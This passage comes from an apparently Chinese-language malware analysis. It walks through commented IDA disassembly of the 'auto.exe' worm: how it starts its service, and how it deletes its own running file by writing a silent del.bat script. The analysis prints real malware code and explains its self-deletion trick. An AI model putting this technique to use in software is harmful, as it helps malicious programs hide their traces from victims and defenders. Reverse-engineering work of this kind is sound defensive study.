
```
  00402F58             push    [esp+4+lpServiceName] ; lpServiceName  
  00402F5C             push    edi                 ; hSCManager  
  00402F5D             call    ds:OpenServiceA  
  00402F63             mov     esi, eax  
  00402F65             test    esi, esi  
  00402F67             jz      short loc_402F80  
  00402F69             push    0                   ; lpServiceArgVectors  
  00402F6B             push    0                   ; dwNumServiceArgs  
  00402F6D             push    esi                 ; hService  
  00402F6E             call    ds:StartServiceA  
  00402F74             push    esi                 ; hSCObject  
  00402F75             mov     esi, ds:CloseServiceHandle  
  00402F7B             call    esi ; CloseServiceHandle  
  00402F7D             push    edi                 ; hSCObject  
  00402F7E             call    esi ; CloseServiceHandle  
  00402F80  
  00402F80 loc_402F80:  
  00402F80  
  00402F80             pop     edi  
  00402F81             pop     esi  
  00402F82             retn  
  00402F82 StartVirusService endp  
}  
```

```
00402BEC             add     esp, 1Ch  
```

### 【第七宗罪】 毁尸灭迹

不要以为 `auto.exe` 是个头脑简单的家伙，它干了坏事以后也是要消灭罪证的。想知道如何删除正在运行的程序文件吗？仔细看看下面的代码：

```
00402BEF             cmp     [ebp+var_SysInfectFlag], 0  
00402BF3             jnz     short loc_402BFA  
00402BF5             call    Del_InfectingHost ; 如果当前运行病毒实例不是系统目录下的实例  
00402BF5                                   ; 则在运行完毕以后删除该实例  
```

{

```
  004012E2 Del_InfectingHost proc near  
  004012E2  
  004012E2 var_szDelCmdLine= byte ptr -408h  
  004012E2 var_szFilename  = byte ptr -308h  
  004012E2 var_szSysDirName= byte ptr -208h  
  004012E2 Buffer          = dword ptr -108h  
  004012E2 hObject         = dword ptr -8  
  004012E2 NumberOfBytesWritten= dword ptr -4  
  004012E2  
  004012E2             push    ebp  
  004012E3             mov     ebp, esp  
  004012E5             sub     esp, 408h  
  004012EB             push    ebx  
  004012EC             push    esi  
  004012ED             push    edi  
  004012EE             mov     edi, offset byte_410F20  
  ……………………  
  ……………………  
  00401577             lea     eax, [ebp+var_szFilename]  
  0040157D             push    0FFh                ; nSize  
  00401582             push    eax                 ; lpFilename  
  00401583             push    ebx                 ; hModule  
  00401584             call    ds:GetModuleFileNameA  
  0040158A             lea     eax, [ebp+var_szSysDirName]  
  00401590             push    0FEh                ; uSize  
  00401595             push    eax                 ; lpBuffer  
  00401596             call    ds:GetSystemDirectoryA  
  0040159C             test    eax, eax  
  0040159E             jnz     short loc_4015A8  
  004015A0             or      eax, 0FFFFFFFFh  
  004015A3             jmp     loc_401838  
  004015A8 ; ----------------------------------------------------------------------------  
  004015A8  
  004015A8 loc_4015A8:  
  004015A8             lea     eax, [ebp+var_szSysDirName]  
  004015AE             push    offset asc_410B74 ; "\\\\"  
  004015B3             push    eax  
  004015B4             call    strcat  
  004015B9             mov     ebx, ds:lstrcpy  
  004015BF             pop     ecx  
  004015C0             pop     ecx  
  004015C1             lea     eax, [ebp+var_szSysDirName]  
  004015C7             push    eax  
  004015C8             lea     eax, [ebp+var_szDelCmdLine]  
  004015CE             push    eax  
  004015CF             call    ebx ; lstrcpy  
  004015D1             lea     eax, [ebp+var_szDelCmdLine]  
  004015D7             push    offset aDel_bat ; "del.bat"  
  004015DC             push    eax  
  004015DD             call    ds:lstrcat  
  004015E3             lea     eax, [ebp+var_szSysDirName]  
  004015E9             push    offset aDd33gsd2_exe_0 ; "dd33gsd2.exe"  
  004015EE             push    eax  
  004015EF             call    strcat  
  004015F4             mov     esi, ds:CharUpperA  
  004015FA             pop     ecx  
  004015FB             pop     ecx  
  004015FC             lea     eax, [ebp+var_szSysDirName]  
  00401602             push    eax                 ; lpsz  
  00401603             call    esi ; CharUpperA  
  00401605             push    eax  
  00401606             lea     eax, [ebp+var_szFilename]  
  0040160C             push    eax                 ; lpsz  
  0040160D             call    esi ; CharUpperA  
  0040160F             push    eax  
  00401610             call    ds:lstrcmp         ; 比较当前目录是否为系统目录?  
  00401616             push    1  
  00401618             test    eax, eax  
  0040161A             pop     edi  
  0040161B             jz      loc_401836          ; 是系统目录则放弃接下去的清除操作  
  00401621             mov     esi, ds:Sleep  
  00401627             push    edi                 ; dwMilliseconds  
  00401628             call    esi ; Sleep  
  0040162A             push    edi                 ; dwMilliseconds  
  0040162B             call    esi ; Sleep  
  0040162D             push    edi                 ; dwMilliseconds  
  0040162E             call    esi ; Sleep  
  00401630             push    edi                 ; dwMilliseconds  
  00401631             call    esi ; Sleep  
  00401633             xor     eax, eax  
  00401635             push    eax                 ; hTemplateFile  
  00401636             push    eax                 ; dwFlagsAndAttributes  
  00401637             push    2                   ; dwCreationDisposition  
  00401639             push    eax                 ; lpSecurityAttributes  
  0040163A             push    eax                 ; dwShareMode  
  0040163B             lea     eax, [ebp+var_szDelCmdLine]  
  00401641             push    40000000h           ; dwDesiredAccess  
  00401646             push    eax                 ; lpFileName  
  00401647             call    ds:CreateFileA     ; 建立 del.bat 毁灭证据  
  0040164D             cmp     eax, 0FFFFFFFFh  
  00401650             mov     [ebp+hObject], eax  
  00401653             jz      loc_40181E  
  00401659             lea     eax, [ebp+Buffer]  
  0040165F             push    offset a@echoOff ; "@echo off\\r\\n"  
  00401664             push    eax                 ; 偷偷干，屏幕上不准显示  
  00401665             call    strcpy  
  0040166A             pop     ecx  
  0040166B             pop     ecx  
  0040166C             push    edi                 ; dwMilliseconds  
  0040166D             call    esi ; Sleep  
  0040166F             push    edi                 ; dwMilliseconds  
  00401670             call    esi ; Sleep  
  00401672             push    edi                 ; dwMilliseconds  
  00401673             call    esi ; Sleep  
  00401675             push    edi                 ; dwMilliseconds  
  00401676             call    esi ; Sleep  
  00401678             push    edi                 ; dwMilliseconds  
  00401679             call    esi ; Sleep  
  0040167B             push    edi                 ; dwMilliseconds  
  0040167C             call    esi ; Sleep  
  0040167E             push    edi                 ; dwMilliseconds  
  0040167F             call    esi ; Sleep  
  00401681             push    edi                 ; dwMilliseconds  
  00401682             call    esi ; Sleep  
  00401684             push    edi                 ; dwMilliseconds  
  00401685             call    esi ; Sleep  
```

}
